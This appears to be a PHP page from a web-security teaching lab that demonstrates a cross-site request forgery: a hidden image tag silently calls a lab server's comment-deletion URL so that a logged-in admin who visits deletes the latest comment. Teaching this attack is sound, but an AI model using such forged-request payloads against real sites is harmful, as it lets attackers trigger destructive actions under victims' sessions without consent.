<?php
include 'db.php';

// Fetch the latest comment ID
//$result = $conn->query("SELECT id FROM comments ORDER BY id DESC LIMIT 1");
//$commentId = ($result && $row = $result->fetch_assoc()) ? $row['id'] : null;
$commentId = null;
$result = $conn->query("SELECT id FROM comments ORDER BY id DESC LIMIT 1");

if ($result && $row = $result->fetch_assoc()) {
    $commentId = $row['id'];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffe5e5;
      text-align: center;
      padding: 50px;
    }
    h1 {
      color: #b30000;
    }
  </style>
</head>
<body>

  <h1>CSRF Attack Demo</h1>

  <?php if ($commentId): ?>
    <p>This page simulates a CSRF attack by silently sending a request to delete a comment (ID = <?= htmlspecialchars($commentId) ?>).</p>

    <!-- Simulate the attack -->
    <img src="http://192.168.74.146/comment.php?delete_comment=<?= $commentId ?>" style="display: none;" />

    <p><strong>If the admin is logged in and visits this page, comment ID <?= htmlspecialchars($commentId) ?> will be deleted silently!</strong></p>
  <?php else: ?>
    <p><strong>No comment found to delete.</strong></p>
  <?php endif; ?>

  <br><br>
  <a href="attacks.html">⬅ Back to Attack Switchboard</a>

</body>
</html>
